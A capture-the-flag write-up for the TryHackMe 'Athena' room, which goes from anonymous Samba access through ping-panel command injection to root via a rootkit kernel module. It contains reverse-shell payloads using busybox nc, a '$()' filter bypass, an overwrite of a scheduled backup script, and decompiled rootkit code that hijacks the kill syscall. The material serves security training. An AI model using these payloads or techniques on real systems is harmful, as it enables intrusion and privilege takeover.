# Athena Writeup
*You can find the CTF on [Tryhackme](https://tryhackme.com/room/4th3n4)

## Requirements
+ Always run your tools inside a virtual machine. Kali Linux (or similar) is a good starting point because it comes preloaded with many security tools, but **any Linux distro** in a VM is fine as long as you install what you need. Try not to use the Hackbox and setup your own env!
+ Before reading this writeup, please read the [README](../README.md), because what you are looking for might not be here.

## The Writeup

### Setup and information gathering

<details>
  <summary>Hint 1</summary>

  It looks like a static website. I wonder if there are other services running.
</details>

<details>
  <summary>Hint 2</summary>

  You should take a **Samba** class!
</details>
<details>
  <summary>Hint 3</summary>

  It looks like there is a public Samba share we can look into. 
</details>
<details>
  <summary>Solution</summary>
As I like to do in every box, the first step is to avoid copying and pasting the IP address all the time by giving it a name.

```bash
    export TARGET="10.80.181.149"
```
The first thing I did was check whether the target was hosting a web page by simply browsing to the IP in the browser, and it works.  
It does not look very useful: it only has a single static page and no other visible links we can immediately exploit.

So let’s move on and see which other services are running on the machine:

```bash
    $ sudo nmap -sC -sV -v $TARGET
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 18:55 CET
    ...
    PORT    STATE SERVICE     VERSION
    22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
    ...
    80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
    ...
    139/tcp open  netbios-ssn Samba smbd 4
    445/tcp open  netbios-ssn Samba smbd 4
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ...
```
If you do not know what `-sC`, `-sV`, or `-v` mean, just [Google them or check the Nmap documentation](../README.md).

From this scan we learn that there is an SSH service (probably useful later) and a Samba service.  
Without using any sophisticated tools, with Samba the first thing to try is anonymous access.

```bash
    smbclient -L $TARGET -N
    Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk
        IPC$            IPC       IPC Service  
```
It looks like we have access to the `public` share without credentials, so let’s see what we can get from it.

```bash
    $ smbclient //$TARGET/public -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Apr 17 02:54:43 2023
  ..                                  D        0  Mon Apr 17 02:54:05 2023
  msg_for_administrator.txt           N      253  Sun Apr 16 20:59:44 2023

                19947120 blocks of size 1024. 9694204 blocks available
smb: \> get msg_for_administrator.txt
getting file \msg_for_administrator.txt of size 253 as msg_for_administrator.txt (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)
```
We find a “secret” that is not so secret after all. Let’s read it:

```bash
    $cat msg_for_administrator.txt

Dear Administrator,

I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel

Yours sincerely,

Athena
Intern
```
Now we have a very good starting point for our investigation: the `/myrouterpanel` path.  
Next step is to understand how this application works and how it can be exploited.

![1](/Athena/screenshots/1.png)

</details>

### From ping to reverse shell:

<details>
  <summary>Hint 1</summary>

  Exposing a bash from your server can be dangerous!
</details>

<details>
  <summary>Hint 2</summary>

  I wonder in [how many ways you can concatenate more commands together in linux](https://github.com/payloadbox/command-injection-payload-list).
</details>
<details>
  <summary>Hint 3</summary>

   When a backup.sh runs every minute, it stops being a script and starts being a scheduled invitation to a privilage escalation.
</details>
<details>
  <summary>Solution</summary>
First, let’s look at the standard output of this website when we use a normal address like:

```bash
    localhost
```

```bash
    PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.016 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.031 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.030 ms
64 bytes from localhost (127.0.0.1): icmp_seq=4 ttl=64 time=0.032 ms

--- localhost ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3073ms
rtt min/avg/max/mdev = 0.016/0.027/0.032/0.006 ms
```
The output looks like the direct output of:

```bash
    ping -c 4 localhost
```

This suggests that if we can inject our own commands, we might be able to trigger a reverse shell. Let’s try to change something without injecting additional commands, for example by changing the number of packets:

```bash
    -c 5 localhost
```


```bash
...
--- localhost ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4076ms
..
```
It works, so we may have found a way into the server. Now let’s try again, this time aiming for a [reverse shell](https://www.revshells.com/).

I want to inject something like:

```bash
    busybox nc 192.168.177.1 9001 -e sh
```
On my machine, I can start a listener and wait for the server to connect:

```bash
    nc -lvnp 9001
```

Let's try an easy payload:

```bash
    -c 5 localhost; busybox nc 192.168.177.1 9001 -e sh
```

Unfortunately, the result of the command is:

```
    Attempt hacking!
```
The website is probably blocking the most common ways to concatenate multiple commands. After some research, I found that:

```bash
localhost$(-c 5 localhost)
```

does not trigger any protection and produces the correct output, so let’s try again with the real payload:

```bash
localhost$(busybox nc 192.168.177.1 9001 -e sh)
```
![2](/Athena/screenshots/2.png)
It works. As shown in the screenshot, we have a working shell that we can easily upgrade with:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Before using automated tools, I like to manually inspect the folders, but unfortunately the www-data user cannot access any home directories. In this case, the hint came from the following command:

```bash
www-data@routerpanel:/$find /usr -writable -type f 2>/dev/null

/usr/share/backup/backup.sh
```
Let’s inspect this backup script. It looks like we can modify the script, but Athena can run it, so there must be some service that executes it periodically. 
```bash
www-data@routerpanel:/usr/share/backup$ systemctl list-unit-files | grep -i athena
...
athena_backup.service                      enabled         enabled
```

```bash
www-data@routerpanel:/usr/share/backup$ systemctl cat athena_backup.service
systemctl cat athena_backup.service
# /etc/systemd/system/athena_backup.service
[Unit]
Description=Backup Athena Notes

[Service]
User=athena
Group=athena
ExecStart=/bin/bash /usr/share/backup/backup.sh
Restart=always
RestartSec=1min

[Install]
WantedBy=multi-user.target
www-data@routerpanel:/usr/share/backup$ systemctl cat athena_backup.service
systemctl cat athena_backup.service
# /etc/systemd/system/athena_backup.service
[Unit]
Description=Backup Athena Notes

[Service]
User=athena
Group=athena
ExecStart=/bin/bash /usr/share/backup/backup.sh
Restart=always
RestartSec=1min

[Install]
WantedBy=multi-user.target
```
So we have a script that we can modify, and systemd runs it every minute as the athena user. This is our entry point into Athena’s account.

I will reuse the same payload, but you can choose any payload you prefer:

```bash
www-data@routerpanel:/usr/share/backup$ echo "busybox nc 192.168.177.1 9001 -e sh" > backup.sh
```

```bash
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.82.172.136:37724.

python3 -c 'import pty; pty.spawn("/bin/bash")'
athena@routerpanel:/$ cat /home/athena/user.txt
```

</details>


### Privilage Escalation
<details>
  <summary>Hint 1</summary>

  When Athena talks to the kernel, it listens.
</details>

<details>
  <summary>Hint 2</summary>

  When insmod loads venom.ko, Ghidra starts hearing whispering functions like “psst… want root?”
</details>
<details>
  <summary>Hint 3</summary>
  
  Sometimes sending the right kill signal does not kill your process… why you don't take a look at give_root?
</details>
<details>
  <summary>Solution</summary>

Now we want to get `root privileges`, so let’s see what Athena can run as root:

```bash
athena@routerpanel:~$ sudo -l
sudo -l
Matching Defaults entries for athena on routerpanel:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User athena may run the following commands on routerpanel:
    (root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko
```

It looks like we can run as root [insmod](https://linux.die.net/man/8/insmod) to insert `venom.ko` into the kernel.
Let’s download the module to better understand what we are dealing with:

```bash
athena@routerpanel:/$ cd /mnt/.../secret/
cd /mnt/.../secret/
athena@routerpanel:/mnt/.../secret$ python3 -m http.server
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
┌──(kali㉿)-[~]
└─$ wget 10.82.172.136:8000/venom.ko
Prepended http:// to '10.82.172.136:8000/venom.ko'
...
```

`Ghidra` helps to understand what venom.ko does; among the exported functions, give_root is particularly interesting:

![3](/Athena/screenshots/3.png)

Let’s dive deeper into the code of give_root:

```c++
void give_root(void)
{
  long lVar1;
  
  lVar1 = prepare_creds();
  if (lVar1 != 0) {
    *(undefined8 *)(lVar1 + 4) = 0;
    *(undefined8 *)(lVar1 + 0xc) = 0;
    *(undefined8 *)(lVar1 + 0x14) = 0;
    *(undefined8 *)(lVar1 + 0x1c) = 0;
    commit_creds(lVar1);
  }
  return;
}
```
The basic identity of a process (user and group IDs) is stored as fields inside a `struct cred`.
To alter the current process’s credentials, a function first prepares a new set of credentials by calling:
```c++
struct cred *prepare_creds(void);
```
Once the new credentials are prepared, the code checks that the function actually returned a valid pointer and not NULL:
```c++
if (lVar1 != 0)
```
At this point we can change the values inside the struct cred, so let’s see how this structure is laid out:

![4](/Athena/screenshots/4.png)

From the different `offsets` added to the base pointer of our new creds, we can see which fields are being `set to 0` (to root):

```c++
    *(undefined8 *)(lVar1 + 4) = 0;  //The real uid
    *(undefined8 *)(lVar1 + 0xc) = 0;  //The saved UID for the task
    *(undefined8 *)(lVar1 + 0x14) = 0; //The effective UID of the task
    *(undefined8 *)(lVar1 + 0x1c) = 0; //The UID for VFS ops
```
By `setting` all these UIDs to 0, the process effectively becomes `root`, which is exactly what we want.

```c++
commit_creds(lVar1);
```
Since now we created our new credentials the commit will make them immutable and they will give us root priviliges. At this point we just need to understand which function can call give_root(), and looking deeper we find:

```c++
int hacked_kill(pt_regs *pt_regs)
{
  undefined1 *puVar1;
  list_head *plVar2;
  int iVar3;
  long lVar4;
  undefined *puVar5;
  
  plVar2 = module_previous;
  iVar3 = (int)pt_regs->si;
  if (iVar3 == 0x39) {
    give_root();
    return 0;
  }
  ...
}
```
Now the situation is clearer: this is a classic `rootkit`. The function takes a `pt_regs *` as input, which contains a copy of all the CPU registers for the syscall. We focus on the si field, which corresponds to the `rsi register`. For who is less comfortable with system calls I will further explain the code in the `extra part`.

In Linux, the kill system call is used to send a signal to a process, and sys_kill expects the int sig argument (the signal number) to be placed in the %rsi register when it is called ([for reference](https://syscalls64.paolostivanin.com/)). So if we run kill with sig = 0x39 (57), the rootkit will execute `give_root()` instead of performing a normal kill.

```bash
athena@routerpanel:~$ sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
athena@routerpanel:~$ echo $$
1695
athena@routerpanel:~$ kill -57 1695
athena@routerpanel:~$ whoami
root
athena@routerpanel:~$ cd /root/
athena@routerpanel:/root$ ls
fsociety00.dat  root.txt
athena@routerpanel:/root$ cat root.txt
```

</details>
<details>
  <summary>Extra</summary>
If you are wondering what is really happening inside the box, here is a short summary of how system calls are handled in Linux.  

When we type the command `kill`, we are indirectly invoking the `kill()` system call wrapper, which sets up the CPU registers as follows before entering kernel mode:  
- `%rax`: the number of the corresponding system call (for Linux, `0x3e` = `62` for `sys_kill`)  
- `%rdi`: the `pid` argument  
- `%rsi`: the `sig` (signal number) argument  

Then the wrapper executes the `syscall` instruction to switch to kernel mode. Once in kernel mode, the kernel uses the value in `%rax` as an index into `sys_call_table`, which is an array of function pointers implementing each system call. The entry at index 62 points to the kernel’s implementation of `sys_kill`.  

If we look again at the functions inside the module, the `init` function is particularly interesting:

```c++
{
  long lVar1;
  ulong *puVar2;
  int iVar3;
  long in_GS_OFFSET;
  ulong __force_order;
  
  lVar1 = *(long *)(in_GS_OFFSET + 0x28);
  __sys_call_table = get_syscall_table_bf(); //pointer to syscall_table
  iVar3 = -1;
  if (__sys_call_table != (ulong *)0x0) {
    ...
    puVar2 = __sys_call_table;
    ...
    puVar2[0xd9] = (ulong)hacked_getdents64;
    puVar2[0x3e] = (ulong)hacked_kill; //sys_kill changed
    iVar3 = 0;
  }
  ...
}
```
As you can see, there is a function called `get_syscall_table_bf()` that retrieves a pointer to `sys_call_table`, and later in the `init` routine the code overwrites specific entries in that table. The entry at index `0x3e` (the `kill` syscall) is replaced with our malicious function `hacked_kill`, so every time the `kill` system call is invoked, the kernel actually runs the rootkit’s function instead of the original `sys_kill`. 

</details>

